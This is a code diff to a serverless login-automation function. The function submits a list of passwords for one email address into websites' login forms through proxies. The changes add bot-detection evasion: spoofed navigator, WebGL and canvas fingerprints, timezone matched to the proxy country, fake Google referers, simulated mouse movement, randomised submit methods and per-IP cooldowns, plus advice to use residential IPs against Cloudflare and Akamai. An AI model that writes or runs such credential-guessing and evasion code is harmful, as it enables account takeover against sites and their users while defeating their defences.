@@ -8,11 +8,50 @@ import puppeteer from 'npm:puppeteer-core@22.7.1';
 const SCRAPINGBEE_API_BASE = 'https://app.scrapingbee.com/api/v1/';
 const BLOCK_MARKERS = ['/blocked', '/error', '/access-denied', '/forbidden', '/captcha', '/challenge'];
 
+// #10 — per-(site, proxy IP) cooldown. Best-effort within a warm isolate;
+// stops the same site+IP being hit more than once per ~45-90s window.
+const COOLDOWN_MIN_MS = 45_000;
+const COOLDOWN_MAX_MS = 90_000;
+const _cooldownMap = new Map(); // key -> lastAttemptMs
+async function cooldownGate(key) {
+  const last = _cooldownMap.get(key);
+  const now = Date.now();
+  const min = COOLDOWN_MIN_MS + Math.floor(Math.random() * (COOLDOWN_MAX_MS - COOLDOWN_MIN_MS));
+  if (last && now - last < min) {
+    const wait = min - (now - last);
+    await new Promise((r) => setTimeout(r, wait));
+  }
+  _cooldownMap.set(key, Date.now());
+}
+
+// #9 — note for operators: residential IPs (via the Proxy / ProxyPool entity)
+// dramatically reduce IP-reputation flagging on Cloudflare/Akamai-protected
+// sites. Datacenter IPs from BB/BL pools have known ASNs.
+
 // Single up-to-date Chrome stable UA. Linux/x86_64 to match the
 // underlying headless container OS — eliminates the UA / navigator.platform
 // contradiction that older configs leaked.
 const CHROME_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
 const CHROME_PLATFORM = "Linux x86_64";
+
+// ISO-2 country code → IANA timezone. Keeps Intl.DateTimeFormat aligned with
+// the proxy IP geolocation so a US-IP/UTC-clock contradiction can't fire.
+const COUNTRY_TZ = {
+  au: 'Australia/Sydney', us: 'America/New_York', gb: 'Europe/London',
+  ca: 'America/Toronto', de: 'Europe/Berlin', fr: 'Europe/Paris',
+  nl: 'Europe/Amsterdam', sg: 'Asia/Singapore', jp: 'Asia/Tokyo',
+  nz: 'Pacific/Auckland', ie: 'Europe/Dublin', es: 'Europe/Madrid',
+};
+
+// Common desktop viewports (rough Statcounter weighting). One is picked per
+// session so every run isn't the same 1920×1080 fingerprint.
+const VIEWPORT_POOL = [
+  { w: 1920, h: 1080, dpr: 1 },
+  { w: 1536, h: 864, dpr: 1.25 },
+  { w: 1440, h: 900, dpr: 1 },
+  { w: 1366, h: 768, dpr: 1 },
+  { w: 1600, h: 900, dpr: 1 },
+];
 
 // Helpers serialised verbatim into the remote Browserless `function`
 // payload AND used directly inside the local Browserbase puppeteer-connect
@@ -99,6 +138,9 @@ async function humanType(page, selector, text) {
 async function preFlight(page, paths, minMs, maxMs) {
   if (!Array.isArray(paths) || paths.length === 0) return;
   const url = paths[rand(0, paths.length - 1)];
+  // Set a Google referer so first-party cookies look like search-arrival
+  // traffic instead of a cold /login hit (#6).
+  try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9', 'Referer': 'https://www.google.com/' }); } catch (_) {}
   try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) { return; }
   const dwell = rand(Math.max(500, minMs || 3500), Math.max(1500, maxMs || 8000));
   const start = Date.now();
@@ -106,6 +148,132 @@ async function preFlight(page, paths, minMs, maxMs) {
     await page.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300));
     await sleep(rand(700, 1800));
   }
+  // Clear the Google referer before continuing — only the first hop should
+  // look like search arrival.
+  try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' }); } catch (_) {}
+}
+
+// Idle scrolling + small mouse drift on the login page itself before we
+// focus the username field. Mimics a user glancing at the form (#5).
+async function loginPageIdle(page) {
+  try {
+    const client = await page.target().createCDPSession();
+    const startX = rand(40, 600);
+    let x = startX, y = 0; // enter from top edge — real cursors arrive from the chrome (#7)
+    const target = { x: rand(200, 700), y: rand(200, 500) };
+    const steps = rand(20, 32);
+    for (let i = 1; i <= steps; i++) {
+      const t = i / steps;
+      x = startX + (target.x - startX) * t + (Math.random() - 0.5) * 4;
+      y = (target.y) * t + (Math.random() - 0.5) * 4;
+      await client.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y, button: 'none' });
+      await sleep(rand(10, 28));
+    }
+    await page.evaluate(() => window.scrollBy(0, 40 + Math.random() * 80));
+    await sleep(rand(600, 1400));
+  } catch (_) {}
+}
+
+// Pick submit method: ~75% click, ~25% Enter-key. Real users do both (#8).
+async function humanSubmit(page, selector, passSelector) {
+  if (Math.random() < 0.25 && passSelector) {
+    await page.focus(passSelector).catch(() => {});
+    await sleep(rand(80, 220));
+    await page.keyboard.press('Enter', { delay: rand(40, 110) });
+  } else {
+    await humanClick(page, selector);
+  }
+}
+`;
+
+// Stealth init script — runs in EVERY new document before any site script.
+// Patches navigator.webdriver, plugins, languages, hardwareConcurrency,
+// deviceMemory, permissions.query, WebGL renderer (#2, #3), and adds tiny
+// canvas-pixel noise so fingerprint hashes vary per session.
+const STEALTH_INIT = `
+(() => {
+  try {
+    // #3 navigator hardening
+    Object.defineProperty(Navigator.prototype, 'webdriver', { get: () => undefined });
+    Object.defineProperty(Navigator.prototype, 'languages', { get: () => ['en-AU', 'en'] });
+    Object.defineProperty(Navigator.prototype, 'hardwareConcurrency', { get: () => 8 });
+    Object.defineProperty(Navigator.prototype, 'deviceMemory', { get: () => 8 });
+    Object.defineProperty(Navigator.prototype, 'platform', { get: () => 'Linux x86_64' });
+
+    // Realistic 3-plugin array (Chrome's built-in PDF plugins)
+    const fakePlugins = [
+      { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+      { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+      { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+    ];
+    Object.defineProperty(Navigator.prototype, 'plugins', { get: () => fakePlugins });
+    Object.defineProperty(Navigator.prototype, 'mimeTypes', { get: () => [{ type: 'application/pdf' }] });
+
+    // permissions.query — headless's classic 'denied'/'prompt' contradiction
+    if (navigator.permissions && navigator.permissions.query) {
+      const orig = navigator.permissions.query.bind(navigator.permissions);
+      navigator.permissions.query = (p) => p && p.name === 'notifications'
+        ? Promise.resolve({ state: Notification.permission, onchange: null })
+        : orig(p);
+    }
+
+    // window.chrome shim — many bot detectors check for this
+    if (!window.chrome) window.chrome = { runtime: {} };
+
+    // #2 WebGL renderer spoof — replace SwiftShader with a real Intel UHD
+    const getParam = WebGLRenderingContext.prototype.getParameter;
+    WebGLRenderingContext.prototype.getParameter = function(p) {
+      if (p === 37445) return 'Intel Inc.';
+      if (p === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)';
+      return getParam.call(this, p);
+    };
+    if (window.WebGL2RenderingContext) {
+      const getParam2 = WebGL2RenderingContext.prototype.getParameter;
+      WebGL2RenderingContext.prototype.getParameter = function(p) {
+        if (p === 37445) return 'Intel Inc.';
+        if (p === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)';
+        return getParam2.call(this, p);
+      };
+    }
+
+    // #2 Canvas noise — perturb a single random pixel so toDataURL hashes vary
+    const toDataURL = HTMLCanvasElement.prototype.toDataURL;
+    HTMLCanvasElement.prototype.toDataURL = function(...args) {
+      try {
+        const ctx = this.getContext('2d');
+        if (ctx && this.width > 0 && this.height > 0) {
+          const x = Math.floor(Math.random() * this.width);
+          const y = Math.floor(Math.random() * this.height);
+          const data = ctx.getImageData(x, y, 1, 1);
+          data.data[0] = (data.data[0] + 1) & 0xff;
+          ctx.putImageData(data, x, y);
+        }
+      } catch (_) {}
+      return toDataURL.apply(this, args);
+    };
+  } catch (_) {}
+})();
+`;
+
+// Apply all stealth profile bits to a page. Idempotent — safe to call once
+// per page right after browser.newPage()/start of remote function. This is
+// itself a *source string* that gets appended to HUMANIZE_PRELUDE so it's
+// available verbatim inside the Browserless remote payload.
+const APPLY_STEALTH_FN = `
+const COUNTRY_TZ = ${JSON.stringify(COUNTRY_TZ)};
+const VIEWPORT_POOL = ${JSON.stringify(VIEWPORT_POOL)};
+const STEALTH_INIT_SRC = ${JSON.stringify(STEALTH_INIT)};
+async function applyStealth(page, countryCode) {
+  const tz = COUNTRY_TZ[(countryCode || 'au').toLowerCase()] || 'Australia/Sydney';
+  const vp = VIEWPORT_POOL[Math.floor(Math.random() * VIEWPORT_POOL.length)];
+  try { await page.setUserAgent(CHROME_UA); } catch (_) {}
+  try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' }); } catch (_) {}
+  try { await page.setViewport({ width: vp.w, height: vp.h, deviceScaleFactor: vp.dpr }); } catch (_) {}
+  // #4 timezone — align Intl with proxy country
+  try { await page.emulateTimezone(tz); } catch (_) {}
+  // #3 #2 navigator + GPU + canvas shims, before any page script.
+  // Pass the source as a string so it runs as-is (an IIFE) on every doc.
+  try { await page.evaluateOnNewDocument(STEALTH_INIT_SRC); } catch (_) {}
 }
 `;
 
@@ -437,6 +605,7 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
 
     const code = `
       ${HUMANIZE_PRELUDE}
+      ${APPLY_STEALTH_FN}
       export default async ({ page }) => {
         const email = ${JSON.stringify(username)};
         const passwords = ${JSON.stringify(list)};
@@ -447,9 +616,10 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         const preFlightPaths = ${JSON.stringify(site.pre_flight_paths || [])};
         const preFlightMin = ${JSON.stringify(site.pre_flight_min_ms || 3500)};
         const preFlightMax = ${JSON.stringify(site.pre_flight_max_ms || 8000)};
+        const country = ${JSON.stringify(proxy.country_code || 'au')};
 
-        await page.setUserAgent(CHROME_UA);
-        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' });
+        // #1 #2 #3 #4 — viewport pool, timezone, navigator/WebGL/canvas shims
+        await applyStealth(page, country);
 
         const started = Date.now();
         const screenshots = [];
@@ -474,6 +644,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
 
           await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 60000 }).catch(() => {});
           await page.waitForSelector(userSel, { visible: true, timeout: 30000 }).catch(() => {});
+          // #5 #7 — idle drift + edge-entry mouse trajectory before focus
+          await loginPageIdle(page);
           await sleep(rand(800, 1800));
 
           for (let i = 0; i < passwords.length; i++) {
@@ -496,7 +668,7 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
 
             await Promise.all([
               page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
-              humanClick(page, submitSel)
+              humanSubmit(page, submitSel, passSel)  // #8 — sometimes Enter, sometimes click
             ]);
 
             await sleep(jitter(i === 0 ? 6000 : 6300));
@@ -599,12 +771,21 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         // Inject the same humanization helpers into the page context so we
         // can call them via page.evaluate. We use a small driver wrapper
         // that bridges Puppeteer's keyboard/mouse APIs to those helpers.
-        await page.setUserAgent(CHROME_UA);
-        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' });
-
         const _rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
         const _jitter = (ms) => Math.max(0, Math.round(ms + (Math.random() * 2 - 1) * ms * 0.3));
         const _sleep = (ms) => new Promise(r => setTimeout(r, _jitter(ms)));
+
+        // #1 #2 #3 #4 — viewport pool, timezone aligned to proxy country,
+        // navigator hardening, WebGL/canvas spoofing. Runs before the page
+        // ever sees a script.
+        const _country = (proxy.country_code || 'au').toLowerCase();
+        const _tz = COUNTRY_TZ[_country] || 'Australia/Sydney';
+        const _vp = VIEWPORT_POOL[_rand(0, VIEWPORT_POOL.length - 1)];
+        await page.setUserAgent(CHROME_UA);
+        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' });
+        try { await page.setViewport({ width: _vp.w, height: _vp.h, deviceScaleFactor: _vp.dpr }); } catch (_) {}
+        try { await page.emulateTimezone(_tz); } catch (_) {}
+        try { await page.evaluateOnNewDocument(STEALTH_INIT); } catch (_) {}
 
         const _dispatchPointer = (sel) => page.evaluate((s) => {
           const el = document.querySelector(s);
@@ -677,12 +858,45 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
           const paths = site.pre_flight_paths || [];
           if (paths.length === 0) return;
           const url = paths[_rand(0, paths.length - 1)];
+          // #6 — Google referer on the warm-up hop
+          try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9', 'Referer': 'https://www.google.com/' }); } catch (_) {}
           try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 }); } catch (_) { return; }
           const dwell = _rand(Math.max(500, site.pre_flight_min_ms || 3500), Math.max(1500, site.pre_flight_max_ms || 8000));
           const start = Date.now();
           while (Date.now() - start < dwell) {
             await page.evaluate(() => window.scrollBy(0, 120 + Math.random() * 300));
             await _sleep(_rand(700, 1800));
+          }
+          try { await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-AU,en;q=0.9' }); } catch (_) {}
+        };
+
+        // #5 #7 — idle drift on the login page itself, mouse enters from edge
+        const _loginPageIdle = async () => {
+          try {
+            const client = await page.target().createCDPSession();
+            const startX = _rand(40, 600);
+            const target = { x: _rand(200, 700), y: _rand(200, 500) };
+            const steps = _rand(20, 32);
+            for (let i = 1; i <= steps; i++) {
+              const t = i / steps;
+              const x = startX + (target.x - startX) * t + (Math.random() - 0.5) * 4;
+              const y = target.y * t + (Math.random() - 0.5) * 4;
+              await client.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y, button: 'none' });
+              await _sleep(_rand(10, 28));
+            }
+            await page.evaluate(() => window.scrollBy(0, 40 + Math.random() * 80));
+            await _sleep(_rand(600, 1400));
+          } catch (_) {}
+        };
+
+        // #8 — ~25% Enter-key submit, otherwise click
+        const _humanSubmit = async () => {
+          if (Math.random() < 0.25) {
+            await page.focus(passSel).catch(() => {});
+            await _sleep(_rand(80, 220));
+            await page.keyboard.press('Enter', { delay: _rand(40, 110) });
+          } else {
+            await _humanClick(submitSel);
           }
         };
 
@@ -693,6 +907,7 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         } catch (_) {
           // Ignore, we will try to type anyway if available
         }
+        await _loginPageIdle();
         await _sleep(_rand(800, 1800));
 
         for (let i = 0; i < list.length; i++) {
@@ -715,7 +930,7 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
 
           await Promise.all([
             page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
-            _humanClick(submitSel)
+            _humanSubmit()
           ]);
 
           // Randomised dwell after submit (±30%).
@@ -942,6 +1157,9 @@ Deno.serve(async (req) => {
       let advancedError = null;
 
       if (!useLegacy) {
+        // #10 — site+IP cooldown (best-effort within isolate)
+        const cooldownKey = `${s.key}::${proxy.external?.host || proxy.mode}`;
+        await cooldownGate(cooldownKey);
         try {
           advancedResult = await testSiteAdvanced(provider, providerCredentials, settings, proxy, s, loginUrl, username, passwords, strategy);
         } catch (err) {
